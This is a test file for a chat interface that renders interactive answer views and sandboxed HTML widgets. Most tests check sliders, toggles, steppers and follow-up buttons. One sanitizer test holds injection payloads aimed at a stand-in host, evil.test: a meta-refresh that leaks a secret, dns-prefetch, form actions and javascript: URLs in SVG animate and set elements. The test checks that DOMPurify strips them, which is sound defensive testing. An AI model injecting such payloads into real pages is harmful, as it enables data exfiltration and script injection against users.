import { afterEach, expect, test } from "bun:test";
import type { Spec } from "@json-render/core";
import { modules } from "@my-better-t-app/api/views/read-me";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import createDOMPurify from "dompurify";

import "@/i18n";

import { AnswerView } from "./components/answer";
import { AskContext } from "./components/answer/ask";
import { layoutFlow } from "./components/answer/diagrams";
import { WIDGET_PURIFY_CONFIG } from "./components/answer/widget-sanitize";
import { WIDGET_CSP, WIDGET_SHELL } from "./components/answer/widget-shell";
import { ThreadView } from "./components/chat/thread-view";
import type { ChatMessage } from "./components/chat/transport";
import type { Turn } from "./components/chat/turns";

afterEach(() => cleanup());

const view = (elements: Record<string, unknown>, state?: Record<string, unknown>): Spec =>
  ({
    root: "answer",
    ...(state ? { state } : {}),
    elements: {
      answer: { type: "Answer", props: {}, children: Object.keys(elements) },
      ...elements,
    },
  }) as Spec;

function specParts(value: Spec): ChatMessage["parts"] {
  const patch = (path: string, v: unknown): ChatMessage["parts"][number] => ({
    type: "data-spec",
    data: { type: "patch", patch: { op: "add", path, value: v } },
  });
  return [
    patch("/root", value.root),
    ...(value.state ? [patch("/state", value.state)] : []),
    ...Object.entries(value.elements).map(([key, element]) => patch(`/elements/${key}`, element)),
  ];
}

const assistant = (parts: ChatMessage["parts"]): Turn[] => [
  { id: "a", role: "assistant", steps: [], parts },
];

test("the interactive example recomputes its readout and plot as the slider moves", () => {
  render(<AnswerView spec={modules.interactive.example as Spec} />);
  // 1000 at 5% for 20 years.
  expect(screen.getByText("$2,653")).toBeTruthy();
  expect(screen.getByText("After 20 years")).toBeTruthy();
  fireEvent.change(screen.getByLabelText("Years"), { target: { value: "10" } });
  expect(screen.getByText("$1,629")).toBeTruthy();
  expect(screen.getByText("After 10 years")).toBeTruthy();
  expect(screen.getByRole("img", { name: "Balance" })).toBeTruthy();
});

test("toggle and choice write to state", () => {
  const spec = view(
    {
      on: {
        type: "Toggle",
        props: { label: "Yearly", checked: { $bindState: "/yearly" } },
        children: [],
      },
      mode: {
        type: "Choice",
        props: {
          label: "Plan",
          value: { $bindState: "/plan" },
          options: [
            { value: "a", label: "Basic" },
            { value: "b", label: "Pro" },
          ],
        },
        children: [],
      },
      out: {
        type: "Readouts",
        props: {
          items: [
            {
              label: { $template: "Plan ${/plan}" },
              value: {
                $computed: "calc",
                args: { expr: "base * (1 + y)", base: 10, y: { $state: "/yearly" } },
              },
            },
          ],
        },
        children: [],
      },
    },
    { yearly: false, plan: "a" },
  );
  render(<AnswerView spec={spec} />);
  expect(screen.getByText("10")).toBeTruthy();
  fireEvent.click(screen.getByRole("switch", { name: "Yearly" }));
  expect(screen.getByText("20")).toBeTruthy();
  fireEvent.click(screen.getByRole("radio", { name: "Pro" }));
  expect(screen.getByText("Plan b")).toBeTruthy();
});

test("a flow is laid out in ranks, with at most four nodes across", () => {
  const flow = modules.explain.example!.elements.flow!.props as Parameters<typeof layoutFlow>[0];
  const { placed, width } = layoutFlow(flow);
  expect(placed.get("request")!.y).toBe(0);
  expect(placed.get("hit")!.y).toBe(placed.get("origin")!.y);
  expect(placed.get("store")!.y).toBeGreaterThan(placed.get("origin")!.y);
  expect(width).toBeLessThanOrEqual(640);

  render(<AnswerView spec={modules.explain.example as Spec} />);
  expect(screen.getByText("In the cache?")).toBeTruthy();
  expect(screen.getByText("yes")).toBeTruthy();
});

test("a stepper shows one step at a time", () => {
  const steps = view({
    s: {
      type: "Steps",
      props: {
        mode: "stepper",
        steps: [
          { title: "Call stack runs", detail: "Synchronous code first." },
          { title: "Microtasks drain", detail: "Promises settle." },
        ],
      },
      children: [],
    },
  });
  render(<AnswerView spec={steps} />);
  expect(screen.getByText("Call stack runs")).toBeTruthy();
  expect(screen.queryByText("Microtasks drain")).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "Next" }));
  expect(screen.getByText("Microtasks drain")).toBeTruthy();
  expect(screen.getByText("2 of 2")).toBeTruthy();
});

test("follow-ups send their prompt, wait during a turn, and are gone on a shared page", () => {
  const spec = view({
    f: {
      type: "FollowUps",
      props: { items: [{ label: "Why?", prompt: "Why does the cache expire?" }] },
      children: [],
    },
  });
  const sent: string[] = [];
  const { rerender } = render(
    <AskContext.Provider value={(text) => sent.push(text)}>
      <AnswerView spec={spec} />
    </AskContext.Provider>,
  );
  fireEvent.click(screen.getByRole("button", { name: /Why\?/ }));
  expect(sent).toEqual(["Why does the cache expire?"]);

  rerender(
    <AskContext.Provider value={null}>
      <AnswerView spec={spec} />
    </AskContext.Provider>,
  );
  expect((screen.getByRole("button", { name: /Why\?/ }) as HTMLButtonElement).disabled).toBe(true);

  cleanup();
  render(<AnswerView spec={spec} />);
  expect(screen.queryByRole("button", { name: /Why\?/ })).toBeNull();
});

test("two views in one answer each sit in their place, and a broken one is left out", () => {
  const notes = (title: string, items: string[]) =>
    view({ n: { type: "Notes", props: { title, items }, children: [] } });
  const parts = [
    { type: "text", text: "First prose." },
    ...specParts(notes("First notes", ["a"])),
    { type: "text", text: "Second prose." },
    ...specParts(notes("Broken notes", [])),
    { type: "text", text: "Third prose." },
    ...specParts(notes("Third notes", ["c"])),
  ] as ChatMessage["parts"];
  render(<ThreadView turns={assistant(parts)} draft="" onDraft={() => {}} onSend={() => {}} />);
  const order = ["First prose.", "First notes", "Second prose.", "Third prose.", "Third notes"].map(
    (text) => screen.getByText(text),
  );
  for (let i = 1; i < order.length; i++) {
    expect(
      order[i - 1]!.compareDocumentPosition(order[i]!) & Node.DOCUMENT_POSITION_FOLLOWING,
    ).toBeTruthy();
  }
  expect(screen.queryByText("Broken notes")).toBeNull();
});

test("a widget draws in a sandboxed frame where the tool call was, and stays out of the trace", () => {
  const parts = [
    { type: "text", text: "Here is the hash map." },
    {
      type: "tool-show_widget",
      toolCallId: "w",
      state: "output-available",
      input: { title: "Buckets", html: "<svg viewBox='0 0 680 200'></svg>" },
      output: { shown: true, detail: { title: "Buckets" } },
    },
    { type: "text", text: "Each key lands in one bucket." },
  ] as ChatMessage["parts"];
  render(<ThreadView turns={assistant(parts)} draft="" onDraft={() => {}} onSend={() => {}} />);
  const frame = document.querySelector("iframe")!;
  expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
  expect(frame.getAttribute("title")).toBe("Buckets");
  const before = screen.getByText("Here is the hash map.");
  const after = screen.getByText("Each key lands in one bucket.");
  expect(before.compareDocumentPosition(frame) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  expect(frame.compareDocumentPosition(after) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
});

test("the widget shell blocks the network and carries its bridge", () => {
  expect(WIDGET_CSP).toContain("connect-src 'none'");
  expect(WIDGET_CSP).toContain("img-src data: blob:");
  expect(WIDGET_CSP).toContain("default-src 'none'");
  expect(WIDGET_SHELL).toContain(WIDGET_CSP);
  expect(WIDGET_SHELL).toContain("sendPrompt");
  expect(WIDGET_SHELL).toContain("morphdom");
  expect(WIDGET_SHELL).toContain("DOMPurify");
  expect(WIDGET_SHELL).toContain(`window.purifyConfig=${JSON.stringify(WIDGET_PURIFY_CONFIG)}`);
});

test("DOMPurify takes out what the CSP cannot stop, and keeps scripts and handlers", () => {
  const purify = createDOMPurify(window as never);
  const template = document.createElement("template");
  template.innerHTML = purify.sanitize(
    `
    <meta http-equiv="refresh" content="0;url=https://evil.test/?q=secret">
    <link rel="dns-prefetch" href="//secret.evil.test">
    <base href="https://evil.test/">
    <iframe src="https://evil.test/"></iframe><object data="x"></object><embed src="x">
    <a id="ping" href="https://ok.test/" ping="https://evil.test/" target="_top">ok</a>
    <a id="js" href=" javascript:alert(1)">js</a>
    <form id="form" action="https://evil.test/"><button formaction="https://evil.test/">go</button></form>
    <svg><a id="svg-link" href="#x"><animate attributeName="href" to="javascript:alert(1)"/></a>
      <set attributeName="xlink:href" to="javascript:alert(1)"/><circle r="4"/></svg>
    <img id="img" src="data:image/png;base64,AAAA">
    <button id="btn" onclick="sendPrompt('why')">ask</button>
    <script>for (let i = 0; i < 2; i++) document.body.insertAdjacentHTML("beforeend", "<p>x</p>")</script>
    <style>.a{color:var(--ink)}</style>`,
    WIDGET_PURIFY_CONFIG,
  );
  const root = template.content;
  for (const tag of ["meta", "link", "base", "iframe", "object", "embed", "animate", "set"]) {
    expect([tag, root.querySelector(tag)]).toEqual([tag, null]);
  }
  expect(root.querySelector("#ping")!.hasAttribute("ping")).toBe(false);
  expect(root.querySelector("#ping")!.hasAttribute("target")).toBe(false);
  expect(root.querySelector("#ping")!.getAttribute("href")).toBe("https://ok.test/");
  expect(root.querySelector("#js")!.hasAttribute("href")).toBe(false);
  // A form would reload the frame on submit; its controls stay.
  expect(root.querySelector("form")).toBeNull();
  expect(root.querySelector("button[formaction]")).toBeNull();
  expect(root.querySelector("button")).not.toBeNull();
  expect(root.querySelector("#img")!.getAttribute("src")).toContain("data:image/png");
  expect(root.querySelector("#btn")!.getAttribute("onclick")).toBe("sendPrompt('why')");
  expect(root.querySelector("script")).not.toBeNull();
  expect(root.querySelector("style")).not.toBeNull();
  expect(root.querySelector("circle")).not.toBeNull();
  expect(purify.removed.length).toBeGreaterThan(0);
});

test("a widget whose frame navigates away is taken down", () => {
  const parts = [
    {
      type: "tool-show_widget",
      toolCallId: "w",
      state: "output-available",
      input: { title: "Buckets", html: "<p>hi</p>" },
      output: { shown: true, detail: { title: "Buckets" } },
    },
  ] as unknown as ChatMessage["parts"];
  render(<ThreadView turns={assistant(parts)} draft="" onDraft={() => {}} onSend={() => {}} />);
  const frame = document.querySelector("iframe")!;
  fireEvent.load(frame);
  expect(document.querySelector("iframe")).not.toBeNull();
  fireEvent.load(frame);
  expect(document.querySelector("iframe")).toBeNull();
  expect(screen.getByText("“Buckets” tried to leave its frame and was stopped.")).toBeTruthy();
});
